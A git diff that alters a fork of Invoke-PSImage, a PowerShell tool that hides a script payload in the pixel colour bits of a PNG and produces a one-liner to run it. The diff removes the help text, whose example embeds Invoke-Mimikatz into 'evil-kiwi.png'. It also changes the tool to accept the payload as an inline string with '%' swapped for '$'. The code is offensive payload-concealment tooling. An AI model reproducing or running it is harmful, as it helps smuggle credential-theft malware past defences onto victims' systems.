@@ -1,44 +1,5 @@
+<# Hard fork from: https://github.com/peewpw/Invoke-PSImage #>
 function Invoke-PSImage {
-	<#
-.SYNOPSIS
-https://github.com/peewpw/Invoke-PSImage
-Embeds a PowerShell script in an image and generates a oneliner to execute it.
-Author:  Barrett Adams (@peewpw)
-
-.DESCRIPTION
-
-Embeds a PowerShell script in an image by editing the least significant 4 bits of
-2 color values (2 of RGB) in each pixel (for as many pixels as are needed for the payload).
-Image quality will suffer as a result, but it still looks decent. The image is saved as a
-PNG, and can be losslessly compressed without affecting the ability to execute the payload
-as the data is stored in the colors themselves. It can accept most image types as input, but
-output will always be a PNG because it needs to be lossless.
-
-.PARAMETER Script
-
-The path to the script to embed in the Image.
-
-.PARAMETER Image
-
-The image to embed the script in.
-
-.PARAMETER Out
-
-The file to save the resulting image to (image will be a PNG)
-
-.PARAMETER Web
-
-Output a command for reading the image from the web instead of reading from a file.
-You will need to host the image and insert the URL into the command.
-
-.EXAMPLE
-
-PS>Import-Module .\Invoke-PSImage.ps1
-PS>Invoke-PSImage -Script .\Invoke-Mimikatz.ps1 -Image .\kiwi.jpg -Out .\evil-kiwi.png
-   [Oneliner to execute from a file]
-   
-#>
-
 	[CmdletBinding()] Param (
 		[Parameter(Position = 0, Mandatory = $True)]
 		[String]
@@ -61,10 +22,7 @@ PS>Invoke-PSImage -Script .\Invoke-Mimikatz.ps1 -Image .\kiwi.jpg -Out .\evil-ki
 	[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Drawing")
 	[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Web")
     
-	# Normalize paths beacuse powershell is sometimes bad with them.
-	if (-Not [System.IO.Path]::IsPathRooted($Script)) {
-		$Script = [System.IO.Path]::GetFullPath((Join-Path (pwd) $Script))
-	}
+	# Normalize paths beacuse powershell is sometimes bad with them
 	if (-Not [System.IO.Path]::IsPathRooted($Image)) {
 		$Image = [System.IO.Path]::GetFullPath((Join-Path (pwd) $Image))
 	}
@@ -73,7 +31,7 @@ PS>Invoke-PSImage -Script .\Invoke-Mimikatz.ps1 -Image .\kiwi.jpg -Out .\evil-ki
 	}
         
 	# Read in the script
-	$ScriptBlockString = [IO.File]::ReadAllText($Script)
+	$ScriptBlockString = $Script -replace "%", "$"
 	$input = [ScriptBlock]::Create($ScriptBlockString)
 	$payload = [system.Text.Encoding]::ASCII.GetBytes($input)
 
